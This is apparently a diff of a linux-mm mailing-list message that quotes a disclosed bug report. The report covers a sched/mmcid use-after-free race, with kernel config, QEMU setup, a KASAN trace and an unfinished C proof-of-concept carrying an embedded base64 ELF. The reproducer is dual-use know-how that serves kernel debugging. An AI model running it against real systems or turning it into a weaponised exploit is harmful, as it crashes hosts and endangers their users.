-X-HE-Meta: U2FsdGVkX18kefjvuFyV9D5bTSLfo7TmLRGeNLFu6mx+9UJsnDiSPsnaYwC2XHDudllZHiheMlo7CAwgIZm1ue8KlQwuaJKU2DxZ6HY/iJfgqM3bXYdXunmTZLDISfwTuyQyAPfiek23OtdKk2tAV0fcVOcBNvT+CxpULcLi+ETPmuxoqAXrbBm/t/DV2vpZDsMAhzZ3cTNX7sT3edszESXIG0+umMn0z6A1IhS3v7c8i6aDYucqs98i8W9EwHwUiXDyZm/W0kK7Ag/aZaO2tuCpQ8AzLg/DyIQ9oyQWjEspjvnHNpHHk92vP3T07m7YKXhGEbXNBI5KCaE+f4KqNvd1C1FaFHLFhkaIVYp99uv7FZdHct+OenYpkwVZOMdGlAhrNdWZMtPaXrk1wzh4apOLcCkYrC8U8mvig0lB/PSC3Y0dwRmukxnLu3fWMO6lu64eCgEUMTHN3TBNIRmX+rjLE0IpeZdzC4JmQPG+IUoeKw77Y5P7yvc8y1laaBp2EZ/yE5z0JBuvnMBV9Rp7pOZhvq9J1wRsN5Frzql9pVMece0Sotgz+2uvhMmpfmNvNw5rNdXTXDXoz+mEdOvAeFjZiZQV1UungPkuC9ud2nPSzcghBMLvUWe2Vu23SeeLY0M4OBanRkildIiWP7/txpVPUu8CMThgm3GKvi/SKQ8BCA/RtJG5FJdjjW/oh+ZXh/s+ZwYxCQIYHj771O6kblE8TUAXZzr88nWjh7c+anQdxmDpZeRKU+IRDByrwOYI4VL+dax1oHrgCcQBzUkdwQKp+QCfi11BHmabhY6+xjFOqglPSn7seGfYXN5FFymzQoqUaKQL+8trWlFTT4IEbo2Jv+QUGShABVOxX7NPshzi6qwIAS94w0SpDAR2Ws9QlpRZwJFY9xcWzOR941BUsWzazFyDSl+rM77GDxCU8KV3JBnMhs/N8jA6Ovz5/37/stBmPWLH9FGm9KrgZHE
- SAKFjByI
- l81bUIIsKbjxhzvTzuPnmd7/qrIG9DOopSEhgyYa73XFHNn/Oemtoq4uquIvQlT0xwiiCCj8WeksQ61kCjMh30LI+gJGO+sPcYEEj+Q1d3XVSACTXV7w4bXh3j+gezvly8mxITfiTJbTvrVwQjSPo2AA1AOcVCiNA4zRVfYmY16mzmqiB9tmtPSZIqsJvJae7h8NQ4Klv2rhSPfvYpE23pGvlY3b+0mqfN5fKu575LRvPXgyzs0fhC5HUG1QkFW9Q30xj606qt+V1n9+28FQy1sJGYciZ2fqZIyzudjKIR1ad+LlSJzzyeHTL4DfSLWcX4PK5P7jiewpUOwWHZy+4rxPldLbMypeaRrkytaW0gGuNR/3bTZKm3Cp5YoMiVMyqF4+nKHC01mqNceV5PN5D7wnqFtD3lrvX/ROk1r7ah/YyeEwPWJS3wjn7K6Oa0CvvOfCQ1KYLyNxR6kIlcKt/pI+RzJvePOjWR+pISfRO1gVhengONykVPFr2GTleOS8aqIYao64zwvi+QWY9JYQMTIICYJ65kLc6tRpXtwfPZ/i/wMSN8OnVzuI4bQapKkHYNEcqkRz5oJpt/JOH2+cFHD+O56vkYIgxapbqXe0Ob+bvJIZqrpZDWG6s+HbRoRyly5Mx8Je1ZrZHFAyCWWySNtoU+1ZunGYkHg78KCV/OfQobZtexclNvHsXsfrl4hUbln1bgVBbAEpeNBz849TSJOfOWFMNzskgYO5DZ2QYqtB6DTCy9N3HJmtj82Zzm9kDnFUM24NLHwkz28x7WTy82uAH2Q==
+X-Rspamd-Queue-Id: 6BA58160005
+X-Spam-Status: No, score=-7.3 required=3.0 tests=BAYES_00,DKIMWL_WL_HIGH,
+	DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,HEADER_FROM_DIFFERENT_DOMAINS,
+	MAILING_LIST_MULTI,SPF_HELO_PASS,SPF_PASS,USER_AGENT_SANE_1
+	autolearn=no autolearn_force=no version=4.0.1
+X-Stat-Signature: 66uya7s9ird45597rq71k79bcwi4z6ei
+X-HE-Tag: 1795541293-919844
+X-HE-Meta: U2FsdGVkX19p4oUaTZofemFFAZyoKG7w3wEvkeqWc+CHMhRsObg9wvykyxXRBnTnHrJC/xV01Hdv63To+CdfszLycR/U+WXLrGM4tDvqwjycDiHrOWaE1Vwrf3SxLvweq8/KAfH8uzJbiWbBpwPjjuMmhYOYkDATCv77Vd8OtjbdeLeiyCJr1FVeL5V24ca9br5k+OkkGR2vpVZU/FeTTmsEiTup0aoJ1jjVveJnFzLAIZQu5BS2rBWjvbfAy1KqOwfJtp8aIU87RWsyvn0gu+EjgtuHVGBrE4S5zOXlxGPP1+ZiyCaAz0HCUUyRn9ou251QIhaT96kNtphgFMsrbteGPYD84GIS4bfSFHPO2RheoJcjPcaCip4Kr/VSWi6B9E5JYEZ65FVRGq1AqUBwDX3f+Q35AdmzM6+Ija1EFu/9skwVaJ/Dsd1ELd9RLV5aE25OhZqSEJphAPNqtl9AduL+1iSpOtdk+6Wgfgh9Hll/6mOdI6OWrTmPTDPnJtWzDVPjiYp91JBB2N+LXvawygVT4OmDVNo4L7K2ctwfzas1K/+GdJ5ll4BDO8+USHcitxPVpdDDrekZSfz3rL1yBczqWT5IzZmnHf0/ZQ3lACwt2NpETPd5s6lu4glRwtpQ+g7k9Cmob4vikFQGOKC0F4jLNDgLXEvj/nZWzDV53r9LLbSi7nAAG34LP/YvYXNLHBQ70URuB9ZKM9qW/N0MpDuLFTxWkg4URQSmA1LqLb1Og4RxyVGGjnMIwIn7Yi1ldbDoY/pF26I0Uw1R7Ys4udgUn3xuIMAhmRDMDDTPwdaYUFZKZB8+2/7Z1rqntCFsXV+Uny4fPzYg28tLoBHWjU5ZdRfDTWO765/E/4uDGMM+BEYso3V7+8J8+Z1Y8eGBOfo7qM/igi9JzGmJSel1xLah/FDVyFKz3If3+q2Ojt5qbG6+xkx6/2jjTE3JmjDU18hwMk6JR0iJUB2JCEC
+ sOepkW7R
+ oH8/4PWpaJ1v3DkxUp8xG2M/iId0LnFsZTnGXqHYaM4xltgpoeIf9PGUUgilfIZWGWEMsCrJE38nz7i1ac1QWSVE5Xj2vfbZMx5lTnBnf6w9ad/QVTdVP6wm9Kmw5nXo7acvNu5NtyFjxsrcElaAkCWSGjs1NfLI/40OoP6YrBWi94XaoYJ9AVwCYCGzHDjPqG1xB/GEPgfEOhKnTPVkmC8AmrsYPtPspxhOtcz0JiewHlTOR0UXRfY9eCIhe6QxeG6QmZy9zy+TIShCItgg0NiEEJNTOk9qz+2qzHgPi3mMfmLwYGtnmT9Azh4eRO/eTHByyHYL55818+56OwBT6onBblA/LmihtNhXjG/o2Zl8qFvIdxHRuMS03ma1PlFVYKKeKiIIayGwRreb9035o7XpJjWILsY2uhEYamOouikB11GMxuSIA9w6W99i1O3Dj6TF+/Yr//0ag08X7jnytJb1mBf04wSS3+4ImwNpcbzmsbldjAQo8c8BNVZgWlmQKC2TVQS39Y5cMLXtZ4aFPyjGQcHMU2kviOazA3lVzzw8IJfbpl6zwkD2qDkE/CckKiB/v8kE3zKr6eiZ3zfHunNjEdw5EnpczfxeOC6AVpjjWRott6qCLtVvgGPqG5POhsPr3EEyISxQp5S5VROuWqZjZxx+x2ervV/l9sgQuwhQRVFsarmhtFRJrUIG2WQTDVB6wFOOzlZPaupHO/UYGLKv+QkVVhocL2P+B82jJLpPAylGDBSNui/8Gb4AuJvv6FSs5FS3th9wQyLZiIQhSRllbXDxuD8HgSaS23tZ7uBASTmWrDfK0Py2zk+90O6dTWUyfMO9swYsSxZ/c8M/O1XFJJtkMNRllwUcuEOBtDXHSxYP87sjUWxdQ5A==
 Sender: owner-linux-mm@kvack.org
 Precedence: bulk
 X-Loop: owner-majordomo@kvack.org
@@ -151,764 +185,48 @@ List-Subscribe: <mailto:majordomo@kvack.org>
 X-Spam-Checker-Version: SpamAssassin 4.0.1 (2024-03-26) on
 	aws-us-west-2-korg-listserv-alma10-1
 
-Mathieu Desnoyers <mathieu.desnoyers@efficios.com> =E4=BA=8E2026=E5=B9=B411=
-=E6=9C=8810=E6=97=A5=E5=91=A8=E4=BA=8C 10:46=E5=86=99=E9=81=93=EF=BC=9A
->
-> +CC tglx.
->
-> On 2026-11-10 13:38, Weiming Shi wrote:
-> > Hi,
-> >
-> > Here is a standalone reproducer for the p->mm lifetime race.
-> >
-> > The tested kernel was commit 05441d697f7f9a927264f4058cbbc6a03dfcac9d
-> > with:
-> >
-> > ```
-> > CONFIG_SMP=3Dy
-> > CONFIG_EXPERT=3Dy
-> > # CONFIG_FUTEX is not set
-> > CONFIG_RSEQ=3Dy
-> > CONFIG_SCHED_MM_CID=3Dy
-> > CONFIG_KASAN=3Dy
-> > CONFIG_KASAN_GENERIC=3Dy
-> > CONFIG_KASAN_INLINE=3Dy
-> > CONFIG_DEBUG_INFO=3Dy
-> > ```
-> >
-> > KASAN and DEBUG_INFO produce and decode the report. The vulnerable path
-> > requires CONFIG_SCHED_MM_CID=3Dy. This exec manifestation also requires
-> > CONFIG_FUTEX=3Dn because futex_exec_done() otherwise serializes old-MM =
-teardown
-> > with the p->pi_lock held by the affinity updater.
-> >
-> > Dependencies and scheduling setup:
-> >
-> > - x86-64 Linux guest with at least four online CPUs;
-> > - gcc and glibc in the guest to build the PoC;
-> > - sched_setaffinity(), memfd_create(), and execveat() available;
-> > - eight guest vCPUs scheduled on four host CPUs for the tested 2:1 over=
-commit;
-> > - UID/GID 65534 for the tested run.
-> >
-> > Host command:
-> >
-> > ```
-> > taskset -c 0-3 qemu-system-x86_64 \
-> >      -accel kvm -machine q35 -cpu max -m 8G -smp 8 \
-> >      -kernel bzImage -initrd initramfs.cpio.gz \
-> >      -append "console=3DttyS0 rdinit=3D/init nokaslr panic_on_warn=3D1 =
-panic=3D-1" \
-> >      -nographic -no-reboot
-> > ```
-> >
-> > Build and run inside the guest:
-> >
-> > ```
-> > gcc -O3 -Wall -Wextra -o poc poc.c
-> > ./poc 180
-> > ```
-> >
-> > The reproducer works as follows:
-> >
-> > 1. It decodes an embedded 848-byte ET_EXEC image into a memfd.
-> > 2. The victim initially pins itself to the penultimate guest CPU. The s=
-etters
-> >     then alternate its affinity between that CPU alone and the last two=
- guest
-> >     CPUs while it repeatedly executes the memfd with execveat(AT_EMPTY_=
-PATH).
-> > 3. Up to six same-UID setter processes run on the other CPUs and altern=
-ate the
-> >     victim between one- and two-CPU affinity masks.
-> > 4. A 31-us periodic userspace SIGALRM provides interrupt pressure.
-> > 5. Host CFS overcommit can deschedule a setter after it loads the
-> >     victim's old p->mm. The victim can then complete setup_new_exec() a=
-nd free
-> >     that old mm before the setter reaches mm_update_cpus_allowed().
-> >
-> > The PoC counts syscall attempts, successful affinity updates, errors, a=
-nd
-> > completed victim execs separately. Every ten-second window must contain=
- both
-> > a successful affinity update and victim exec progress. It checks for an=
- early
-> > victim or setter exit, and a clean result requires successful child sta=
-tuses.
-> >
-> > This is a stochastic race. The progress-checking version reported the U=
-AF
-> > after about 52.60 seconds. The last completed ten-second window before =
-the
-> > crash recorded 2,096,128 successful affinity updates, zero errors, and =
-18,975
-> > completed execs:
-> >
-> > ```
-> > BUG: KASAN: slab-use-after-free in set_cpus_allowed_common
-> > Read of size 4 at addr ffff888123155e4c by task poc/5132
-> > CPU: 4 UID: 65534 PID: 5132 Comm: poc
-> >
-> > Call Trace:
-> >   set_cpus_allowed_common             kernel/sched/core.c:10835
-> >   set_cpus_allowed_fair               kernel/sched/fair.c:10046
-> >   __set_cpus_allowed_ptr_locked       kernel/sched/core.c:3224
-> >   __set_cpus_allowed_ptr              kernel/sched/core.c:3258
-> >   __sched_setaffinity                 kernel/sched/syscalls.c:1161
-> >   sched_setaffinity                   kernel/sched/syscalls.c:1239
-> >   __x64_sys_sched_setaffinity         kernel/sched/syscalls.c:1275
-> >   do_syscall_64                       arch/x86/entry/syscall_64.c:84
-> >   entry_SYSCALL_64_after_hwframe      arch/x86/entry/entry_64.S:121
-> >
-> > Freed by task 5127:
-> >   kmem_cache_free                     mm/slub.c:6757
-> >   __mmput                             kernel/fork.c:1204
-> >   mmput                               kernel/fork.c:1215
-> >   setup_new_exec                      fs/exec.c:1395
-> >   load_elf_binary                     fs/binfmt_elf.c:1024
-> >   bprm_execve                         fs/exec.c:1865
-> >   do_execveat_common.isra.0           fs/exec.c:1963
-> >   __x64_sys_execveat                  fs/exec.c:2047
-> >   do_syscall_64                       arch/x86/entry/syscall_64.c:84
-> >   entry_SYSCALL_64_after_hwframe      arch/x86/entry/entry_64.S:121
-> > ```
-> >
-> > Complete PoC:
-> >
-> > ```c
-> > /*
-> >   * Standalone reproducer for the sched/mmcid p->mm UAF.
-> >   *
-> >   * Build: gcc -O3 -o poc poc.c
-> >   * Run:   taskset -c 0-3 qemu-system-x86_64 ... -smp 8 ...
-> >   * Guest: ./poc [seconds]
-> >   *
-> >   * The tiny self-exec victim is embedded below and executed from memfd=
-.  The
-> >   * tested VM used CONFIG_SCHED_MM_CID=3Dy, CONFIG_FUTEX=3Dn and 2:1 vC=
-PU
-> >   * overcommit (8 vCPUs on 4 host CPUs).
-> >   */
-> > #define _GNU_SOURCE
-> > #include <errno.h>
-> > #include <fcntl.h>
-> > #include <poll.h>
-> > #include <sched.h>
-> > #include <signal.h>
-> > #include <stdint.h>
-> > #include <stdio.h>
-> > #include <stdlib.h>
-> > #include <string.h>
-> > #include <sys/eventfd.h>
-> > #include <sys/mman.h>
-> > #include <sys/prctl.h>
-> > #include <sys/stat.h>
-> > #include <sys/syscall.h>
-> > #include <sys/time.h>
-> > #include <sys/types.h>
-> > #include <sys/wait.h>
-> > #include <time.h>
-> > #include <unistd.h>
-> >
-> > #define DEFAULT_RUNTIME 180
-> > #define MAX_SETTERS 6
-> > #define READY_FD 3
-> > #define VICTIM_FD 4
-> > #define VICTIM_SIZE 848
-> >
-> > /* 848-byte ET_EXEC produced from victim_min_execfd.S + victim_min.ld. =
-*/
-> > static const char victim_b64[] =3D
-> > "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAsABAAAAAAABAAAAAAAAAABACAAAAAAAAAAAAAE=
-AAOAAC"
-> > "AEAABQAEAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAOAEAAAAAAAA4AQAAAA=
-AAAAAQ"
-> > "AAAAAAAAUeV0ZAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
-AACAAA"
-> > "AAAAAABJieS4AQAAAL8DAAAASI01VAAAALoIAAAADwVIg/gIdTlMiedIgecAAOD/vgAAQA=
-C4CwAA"
-> > "AA8FuEIBAAC/BAAAAEiNNSgAAABIjRUpAAAARTHSQbgAEAAADwW4PAAAAL9/AAAADwX0kA=
-EAAAAA"
-> > "AAAAAAAAAAAAAAAgAUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQ=
-AAAAQA"
-> > "8f8AAAAAAAAAAAAAAAAAAAAACgAAAAAAAQAYAUAAAAAAAAAAAAAAAAAADgAAAAAAAQAgAU=
-AAAAAA"
-> > "AAAAAAAAAAAAFAAAAAAAAQAoAUAAAAAAAAAAAAAAAAAAGQAAABIAAQCwAEAAAAAAAGcAAA=
-AAAAAA"
-> > "AHZpY3RpbS5vAG9uZQBlbXB0eQBhcmd2AF9zdGFydAAALnN5bXRhYgAuc3RydGFiAC5zaH=
-N0cnRh"
-> > "YgAuaW1hZ2UAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
-AAAAAA"
-> > "AAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAABAAAABwAAAAAAAACwAEAAAAAAALAAAAAAAA=
-AAiAAA"
-> > "AAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAA=
-A4AQAA"
-> > "AAAAAJAAAAAAAAAAAwAAAAUAAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAA=
-AAAAAA"
-> > "AAAAyAEAAAAAAAAgAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAA=
-AAAAAA"
-> > "AAAAAAAAAAAAAOgBAAAAAAAAIgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=3D=
-";
-> >
-> > struct setter_stats {
-> >       volatile unsigned long long attempts;
-> >       volatile unsigned long long successes;
-> >       volatile unsigned long long errors;
-> > };
-> >
-> > struct shared_state {
-> >       struct setter_stats setters[MAX_SETTERS];
-> > };
-> >
-> > static int b64_value(unsigned char c)
-> > {
-> >       if (c >=3D 'A' && c <=3D 'Z')
-> >               return c - 'A';
-> >       if (c >=3D 'a' && c <=3D 'z')
-> >               return c - 'a' + 26;
-> >       if (c >=3D '0' && c <=3D '9')
-> >               return c - '0' + 52;
-> >       if (c =3D=3D '+')
-> >               return 62;
-> >       if (c =3D=3D '/')
-> >               return 63;
-> >       return -1;
-> > }
-> >
-> > static int install_victim(void)
-> > {
-> >       unsigned char out[VICTIM_SIZE];
-> >       size_t i, n =3D 0;
-> >       unsigned int acc =3D 0, bits =3D 0;
-> >       int fd;
-> >
-> >       for (i =3D 0; victim_b64[i] && victim_b64[i] !=3D '=3D'; i++) {
-> >               int v =3D b64_value((unsigned char)victim_b64[i]);
-> >
-> >               if (v < 0)
-> >                       continue;
-> >               acc =3D (acc << 6) | (unsigned int)v;
-> >               bits +=3D 6;
-> >               if (bits >=3D 8) {
-> >                       bits -=3D 8;
-> >                       if (n =3D=3D sizeof(out)) {
-> >                               errno =3D EOVERFLOW;
-> >                               return -1;
-> >                       }
-> >                       out[n++] =3D (unsigned char)(acc >> bits);
-> >                       acc &=3D (1U << bits) - 1;
-> >               }
-> >       }
-> >       if (n !=3D sizeof(out)) {
-> >               errno =3D EINVAL;
-> >               return -1;
-> >       }
-> >       fd =3D syscall(SYS_memfd_create, "sched-mmcid-victim", 0);
-> >       if (fd < 0)
-> >               return -1;
-> >       if (fd !=3D VICTIM_FD) {
-> >               if (dup2(fd, VICTIM_FD) < 0) {
-> >                       close(fd);
-> >                       return -1;
-> >               }
-> >               close(fd);
-> >               fd =3D VICTIM_FD;
-> >       }
-> >       if (write(fd, out, n) !=3D (ssize_t)n || fchmod(fd, 0700))
-> >               return -1;
-> >       return 0;
-> > }
-> >
-> > static int install_exec_counter(void)
-> > {
-> >       int fd =3D eventfd(0, EFD_NONBLOCK);
-> >
-> >       if (fd < 0)
-> >               return -1;
-> >       if (fd !=3D READY_FD) {
-> >               if (dup2(fd, READY_FD) < 0) {
-> >                       close(fd);
-> >                       return -1;
-> >               }
-> >               close(fd);
-> >       }
-> >       return 0;
-> > }
-> >
-> > static void pin_self(int cpu)
-> > {
-> >       cpu_set_t mask;
-> >
-> >       CPU_ZERO(&mask);
-> >       CPU_SET(cpu, &mask);
-> >       if (sched_setaffinity(0, sizeof(mask), &mask)) {
-> >               fprintf(stderr, "pin cpu%d: %s\n", cpu, strerror(errno));
-> >               _exit(2);
-> >       }
-> > }
-> >
-> > static void alarm_handler(int sig)
-> > {
-> >       (void)sig;
-> > }
-> >
-> > static void enable_irq_pressure(void)
-> > {
-> >       struct sigaction sa =3D { .sa_handler =3D alarm_handler };
-> >       struct itimerval timer =3D {
-> >               .it_interval =3D { .tv_sec =3D 0, .tv_usec =3D 31 },
-> >               .it_value =3D { .tv_sec =3D 0, .tv_usec =3D 31 },
-> >       };
-> >
-> >       sigemptyset(&sa.sa_mask);
-> >       sa.sa_flags =3D SA_RESTART;
-> >       if (sigaction(SIGALRM, &sa, NULL) ||
-> >           setitimer(ITIMER_REAL, &timer, NULL))
-> >               _exit(3);
-> > }
-> >
-> > static int drain_exec_counter(unsigned long long *total)
-> > {
-> >       uint64_t value;
-> >
-> >       for (;;) {
-> >               ssize_t ret =3D read(READY_FD, &value, sizeof(value));
-> >
-> >               if (ret =3D=3D sizeof(value)) {
-> >                       *total +=3D value;
-> >                       continue;
-> >               }
-> >               if (ret < 0 && errno =3D=3D EINTR)
-> >                       continue;
-> >               if (ret < 0 && errno =3D=3D EAGAIN)
-> >                       return 0;
-> >               return -1;
-> >       }
-> > }
-> >
-> > static int wait_for_first_exec(pid_t victim, unsigned long long *execs)
-> > {
-> >       struct pollfd pfd =3D { .fd =3D READY_FD, .events =3D POLLIN };
-> >       int status, ret;
-> >
-> >       do {
-> >               ret =3D poll(&pfd, 1, 5000);
-> >       } while (ret < 0 && errno =3D=3D EINTR);
-> >       if (ret !=3D 1 || !(pfd.revents & POLLIN) ||
-> >           drain_exec_counter(execs) || !*execs)
-> >               return -1;
-> >       ret =3D waitpid(victim, &status, WNOHANG);
-> >       if (ret =3D=3D victim) {
-> >               errno =3D ECHILD;
-> >               return -1;
-> >       }
-> >       return ret < 0 ? -1 : 0;
-> > }
-> >
-> > static void publish_stats(struct setter_stats *stats,
-> >                         unsigned long long attempts,
-> >                         unsigned long long successes,
-> >                         unsigned long long errors)
-> > {
-> >       __atomic_store_n(&stats->attempts, attempts, __ATOMIC_RELAXED);
-> >       __atomic_store_n(&stats->successes, successes, __ATOMIC_RELAXED);
-> >       __atomic_store_n(&stats->errors, errors, __ATOMIC_RELAXED);
-> > }
-> >
-> > static void run_setter(pid_t victim, int cpu, int victim_a, int victim_=
-b,
-> >                      int index, time_t deadline, struct shared_state *s=
-tate)
-> > {
-> >       cpu_set_t one, two;
-> >       unsigned long long attempts =3D 0, successes =3D 0, errors =3D 0;
-> >
-> >       prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
-> >       pin_self(cpu);
-> >       enable_irq_pressure();
-> >       CPU_ZERO(&one);
-> >       CPU_SET(victim_a, &one);
-> >       CPU_ZERO(&two);
-> >       CPU_SET(victim_a, &two);
-> >       CPU_SET(victim_b, &two);
-> >       while (time(NULL) < deadline) {
-> >               if (!syscall(SYS_sched_setaffinity, victim, sizeof(one), =
-&one))
-> >                       successes++;
-> >               else
-> >                       errors++;
-> >               attempts++;
-> >               if (!syscall(SYS_sched_setaffinity, victim, sizeof(two), =
-&two))
-> >                       successes++;
-> >               else
-> >                       errors++;
-> >               attempts++;
-> >               if (!(attempts & 0x3ff))
-> >                       publish_stats(&state->setters[index], attempts,
-> >                                     successes, errors);
-> >       }
-> >       publish_stats(&state->setters[index], attempts, successes, errors=
-);
-> >       _exit(0);
-> > }
-> >
-> > static void load_totals(struct shared_state *state, int nset,
-> >                       unsigned long long *attempts,
-> >                       unsigned long long *successes,
-> >                       unsigned long long *errors)
-> > {
-> >       int i;
-> >
-> >       *attempts =3D *successes =3D *errors =3D 0;
-> >       for (i =3D 0; i < nset; i++) {
-> >               *attempts +=3D __atomic_load_n(&state->setters[i].attempt=
-s,
-> >                                            __ATOMIC_RELAXED);
-> >               *successes +=3D __atomic_load_n(&state->setters[i].succes=
-ses,
-> >                                             __ATOMIC_RELAXED);
-> >               *errors +=3D __atomic_load_n(&state->setters[i].errors,
-> >                                          __ATOMIC_RELAXED);
-> >       }
-> > }
-> >
-> > static int wait_child(pid_t pid, int *status)
-> > {
-> >       pid_t ret;
-> >
-> >       do {
-> >               ret =3D waitpid(pid, status, 0);
-> >       } while (ret < 0 && errno =3D=3D EINTR);
-> >       return ret =3D=3D pid ? 0 : -1;
-> > }
-> >
-> > int main(int argc, char **argv)
-> > {
-> >       struct shared_state *state;
-> >       pid_t victim, setters[MAX_SETTERS];
-> >       time_t deadline;
-> >       unsigned long long attempts =3D 0, successes =3D 0, errors =3D 0;
-> >       unsigned long long execs =3D 0, previous_execs, previous_successe=
-s =3D 0;
-> >       int cpus, runtime, victim_a, victim_b, nset, i, status;
-> >       int spawned =3D 0, failed =3D 0;
-> >
-> >       setvbuf(stdout, NULL, _IONBF, 0);
-> >       setvbuf(stderr, NULL, _IONBF, 0);
-> >       cpus =3D (int)sysconf(_SC_NPROCESSORS_ONLN);
-> >       if (cpus < 4) {
-> >               fprintf(stderr, "need at least four online CPUs\n");
-> >               return 1;
-> >       }
-> >       runtime =3D argc > 1 ? atoi(argv[1]) : DEFAULT_RUNTIME;
-> >       if (runtime <=3D 0)
-> >               runtime =3D DEFAULT_RUNTIME;
-> >       victim_a =3D cpus - 2;
-> >       victim_b =3D cpus - 1;
-> >       nset =3D victim_a < MAX_SETTERS ? victim_a : MAX_SETTERS;
-> >       state =3D mmap(NULL, sizeof(*state), PROT_READ | PROT_WRITE,
-> >                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-> >       if (state =3D=3D MAP_FAILED)
-> >               return 1;
-> >       for (i =3D 0; i < MAX_SETTERS; i++)
-> >               setters[i] =3D -1;
-> >       if (install_exec_counter() || install_victim()) {
-> >               perror("install victim");
-> >               return 1;
-> >       }
-> >
-> >       victim =3D fork();
-> >       if (!victim) {
-> >               cpu_set_t pinned;
-> >               char *const av[] =3D { "victim", NULL };
-> >               char *const ev[] =3D { NULL };
-> >
-> >               prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);
-> >               CPU_ZERO(&pinned);
-> >               CPU_SET(victim_a, &pinned);
-> >               if (sched_setaffinity(0, sizeof(pinned), &pinned))
-> >                       _exit(4);
-> >               syscall(SYS_execveat, VICTIM_FD, "", av, ev, AT_EMPTY_PAT=
-H);
-> >               _exit(127);
-> >       }
-> >       if (victim < 0)
-> >               return 1;
-> >       if (wait_for_first_exec(victim, &execs)) {
-> >               perror("victim did not begin exec loop");
-> >               failed =3D 1;
-> >               goto cleanup;
-> >       }
-> >       deadline =3D time(NULL) + runtime;
-> >       printf("[*] standalone minimal-exec race: runtime=3D%ds setters=
-=3D%d\n",
-> >              runtime, nset);
-> >       printf("[*] victim starts on cpu%d; setters alternate {%d} and {%=
-d,%d}\n",
-> >              victim_a, victim_a, victim_a, victim_b);
-> >       for (i =3D 0; i < nset; i++) {
-> >               setters[i] =3D fork();
-> >               if (!setters[i])
-> >                       run_setter(victim, i, victim_a, victim_b, i,
-> >                                  deadline, state);
-> >               if (setters[i] < 0) {
-> >                       perror("fork setter");
-> >                       failed =3D 1;
-> >                       goto cleanup;
-> >               }
-> >               spawned++;
-> >       }
-> >       previous_execs =3D execs;
-> >       while (time(NULL) < deadline) {
-> >               struct timespec delay;
-> >               time_t remaining =3D deadline - time(NULL);
-> >               pid_t ret;
-> >
-> >               ret =3D waitpid(victim, &status, WNOHANG);
-> >               if (ret =3D=3D victim) {
-> >                       fprintf(stderr, "victim exited early: status=3D0x=
-%x\n", status);
-> >                       victim =3D -1;
-> >                       failed =3D 1;
-> >                       goto cleanup;
-> >               }
-> >               if (ret < 0) {
-> >                       perror("waitpid victim");
-> >                       failed =3D 1;
-> >                       goto cleanup;
-> >               }
-> >               for (i =3D 0; i < spawned; i++) {
-> >                       if (setters[i] < 0)
-> >                               continue;
-> >                       ret =3D waitpid(setters[i], &status, WNOHANG);
-> >                       if (ret =3D=3D setters[i]) {
-> >                               setters[i] =3D -1;
-> >                               if (time(NULL) < deadline || !WIFEXITED(s=
-tatus) ||
-> >                                   WEXITSTATUS(status)) {
-> >                                       fprintf(stderr,
-> >                                               "setter %d exited early: =
-status=3D0x%x\n",
-> >                                               i, status);
-> >                                       failed =3D 1;
-> >                                       goto cleanup;
-> >                               }
-> >                       } else if (ret < 0) {
-> >                               perror("waitpid setter");
-> >                               failed =3D 1;
-> >                               goto cleanup;
-> >                       }
-> >               }
-> >               if (remaining <=3D 0)
-> >                       break;
-> >               delay.tv_sec =3D remaining > 10 ? 10 : remaining;
-> >               delay.tv_nsec =3D 0;
-> >               while (nanosleep(&delay, &delay) && errno =3D=3D EINTR)
-> >                       ;
-> >               if (drain_exec_counter(&execs)) {
-> >                       perror("read exec counter");
-> >                       failed =3D 1;
-> >                       goto cleanup;
-> >               }
-> >               ret =3D waitpid(victim, &status, WNOHANG);
-> >               if (ret =3D=3D victim) {
-> >                       fprintf(stderr, "victim exited early: status=3D0x=
-%x\n", status);
-> >                       victim =3D -1;
-> >                       failed =3D 1;
-> >                       goto cleanup;
-> >               }
-> >               if (ret < 0) {
-> >                       perror("waitpid victim");
-> >                       failed =3D 1;
-> >                       goto cleanup;
-> >               }
-> >               load_totals(state, nset, &attempts, &successes, &errors);
-> >               if (execs =3D=3D previous_execs) {
-> >                       fprintf(stderr, "victim made no exec progress in =
-window\n");
-> >                       failed =3D 1;
-> >                       goto cleanup;
-> >               }
-> >               if (successes =3D=3D previous_successes) {
-> >                       fprintf(stderr,
-> >                               "setters made no successful affinity prog=
-ress in window\n");
-> >                       failed =3D 1;
-> >                       goto cleanup;
-> >               }
-> >               printf("[*] progress: affinity_success=3D%llu attempts=3D=
-%llu "
-> >                      "errors=3D%llu execs=3D%llu\n",
-> >                      successes, attempts, errors, execs);
-> >               previous_execs =3D execs;
-> >               previous_successes =3D successes;
-> >       }
-> >       for (i =3D 0; i < spawned; i++) {
-> >               if (setters[i] < 0)
-> >                       continue;
-> >               if (wait_child(setters[i], &status) || !WIFEXITED(status)=
- ||
-> >                   WEXITSTATUS(status)) {
-> >                       fprintf(stderr, "setter %d failed: status=3D0x%x\=
-n", i, status);
-> >                       failed =3D 1;
-> >               }
-> >               setters[i] =3D -1;
-> >       }
-> >       load_totals(state, nset, &attempts, &successes, &errors);
-> >       if (!attempts || !successes || attempts !=3D successes + errors) =
-{
-> >               fprintf(stderr, "invalid affinity totals\n");
-> >               failed =3D 1;
-> >       }
-> >       if (drain_exec_counter(&execs)) {
-> >               fprintf(stderr, "failed to read final exec progress\n");
-> >               failed =3D 1;
-> >       }
-> >       if (kill(victim, SIGKILL)) {
-> >               perror("kill victim");
-> >               failed =3D 1;
-> >       } else if (wait_child(victim, &status) || !WIFSIGNALED(status) ||
-> >                  WTERMSIG(status) !=3D SIGKILL) {
